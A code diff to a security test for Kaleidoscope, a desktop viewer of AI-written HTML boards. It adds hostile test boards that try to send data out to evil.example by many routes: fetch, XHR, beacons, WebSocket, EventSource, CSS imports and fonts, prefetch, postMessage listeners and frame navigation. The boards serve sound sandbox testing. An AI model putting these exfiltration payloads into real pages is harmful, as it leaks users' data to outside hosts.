@@ -4,9 +4,11 @@
 
 A board is a page an AI wrote, so Kaleidoscope treats it as untrusted code (CLAUDE.md, Security). This
 opens made-up hostile boards in desktop Kaleidoscope (or the copy given, to compare an older one):
-- one that tries every way out it can: fetch, an image beacon, sendBeacon, a WebSocket, a stylesheet and
-  a CSS background from another site, a form that submits itself, window.open, a link, a meta refresh,
-  WebRTC, and navigating its own frame later on; and that listens for any message Kaleidoscope sends it
+- one that tries every way out it can: fetch, XHR, an image beacon, sendBeacon, a WebSocket, an
+  EventSource, a stylesheet, an @import, a font, a prefetch and a CSS background from another site, a form
+  that submits itself, window.open, a link, a meta refresh, WebRTC, and navigating its own frame later on;
+  and that listens for any message Kaleidoscope sends it
+- boards that ask Kaleidoscope to open an AniList link, then navigate away at once and a moment later
 - boards that navigate their own frame at once, before their first load event, to another site, to a
   data: page and to about:blank, each with a listener waiting for whatever Kaleidoscope sends next
 - the same boards saved with Kaleidoscope's Save button and opened as a file of their own
@@ -27,8 +29,10 @@ SPY = '''<script>window.addEventListener('message', function (e) {
   fetch('https://evil.example/got?d=' + encodeURIComponent(JSON.stringify(e.data).slice(0, 120))).catch(function () {});
 });</script>'''
 EVERYTHING = r'''<!DOCTYPE html><html><head><meta charset="utf-8"><title>Hostile board</title>''' + SPY + r'''
+<style>@import url(https://evil.example/import.css);</style>
 <link rel="stylesheet" href="https://evil.example/style.css">
-<style>body{background:url(https://evil.example/bg.png)}</style>
+<link rel="prefetch" href="https://evil.example/prefetch">
+<style>@font-face{font-family:spy;src:url(https://evil.example/font.woff2)}body{background:url(https://evil.example/bg.png);font-family:spy}</style>
 <meta http-equiv="refresh" content="1;url=https://evil.example/meta-refresh">
 </head><body>
 <h1>Recommendations</h1><h2>Taste profile</h2>
@@ -43,6 +47,8 @@ EVERYTHING = r'''<!DOCTYPE html><html><head><meta charset="utf-8"><title>Hostile
   try { new Image().src = 'https://evil.example/beacon?d=1'; } catch (e) {}
   try { navigator.sendBeacon('https://evil.example/sendbeacon', data); } catch (e) {}
   try { new WebSocket('wss://evil.example/ws'); } catch (e) {}
+  try { var x = new XMLHttpRequest(); x.open('POST', 'https://evil.example/xhr'); x.send(data); } catch (e) {}
+  try { new EventSource('https://evil.example/events'); } catch (e) {}
   try { document.getElementById('f').submit(); } catch (e) {}
   try { window.open('https://evil.example/window-open?d=1'); } catch (e) {}
   try { window.open('https://anilist.co/anime/2'); } catch (e) {}
@@ -57,8 +63,14 @@ EVERYTHING = r'''<!DOCTYPE html><html><head><meta charset="utf-8"><title>Hostile
 def instant(target):
     return '<!DOCTYPE html><html><head><script>location.replace(' + json.dumps(target) + ')</script></head><body>Taste profile</body></html>'
 DATA_SPY = 'data:text/html,' + SPY.replace('\n', ' ')
+# ask Kaleidoscope to open an AniList link (the one message a board may send), then navigate away: at once,
+# and a moment later, once Kaleidoscope has handled the message
+def message_then(delay):
+    return ('<!DOCTYPE html><html><head><meta charset="utf-8">' + SPY + '<script>parent.postMessage({ adxOpen: "https://anilist.co/anime/5" }, "*");'
+            'setTimeout(function () { location.href = "https://evil.example/after-message"; }, ' + str(delay) + ');</script></head><body>Taste profile</body></html>')
 BOARDS = {'everything': EVERYTHING, 'instant-away': instant('https://evil.example/steal'),
-          'instant-data': instant(DATA_SPY), 'instant-blank': instant('about:blank')}
+          'instant-data': instant(DATA_SPY), 'instant-blank': instant('about:blank'),
+          'message-then-away': message_then(0), 'message-then-later': message_then(1200)}
 
 SAVE = """(async () => {
   await new Promise(r => setTimeout(r, 800));
@@ -105,6 +117,8 @@ def run(script=f'{R}/desktop/kaleidoscope/kaleidoscope.user.js'):
             if not any(u.startswith('https://anilist.co/anime/2') for u in opened): bad.append('[everything] window.open() to AniList no longer opens')
             if any('"webrtc":"function"' in q for q in reqs): bad.append('[everything] WebRTC is still reachable inside the board')
             if 'Recent activity' not in got.get('strip', ''): bad.append('[everything] the recent activity strip no longer shows on the page around the board')
+        if name.startswith('message-then') and not any(u.startswith('https://anilist.co/anime/5') for u in opened):
+            bad.append(f'[{name}] the board\'s request to open an AniList link was lost')
     # the same boards, saved and opened as a file of their own
     for name in ('everything', 'instant-away'):
         try: reqs, got = open_board(script, BOARDS[name], SAVE)
